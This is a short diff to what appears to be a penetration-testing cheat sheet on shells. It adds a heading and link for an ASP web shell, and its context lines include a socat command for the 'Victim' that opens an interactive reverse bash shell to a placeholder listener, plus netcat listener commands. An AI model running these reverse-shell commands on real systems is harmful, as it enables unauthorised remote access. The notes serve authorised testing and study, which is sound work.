@@ -54,6 +54,9 @@ https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
  * Victim:
  - socat exec:’bash -li’,pty,stderr,setsid,sigint,sane tcp:IP_LISTENER:12345
 
+ ##  ASP web shell
+ https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/webshell
+
  ## Basic Server Listener ##
  nc -l [port]
  nc -lvp [port]
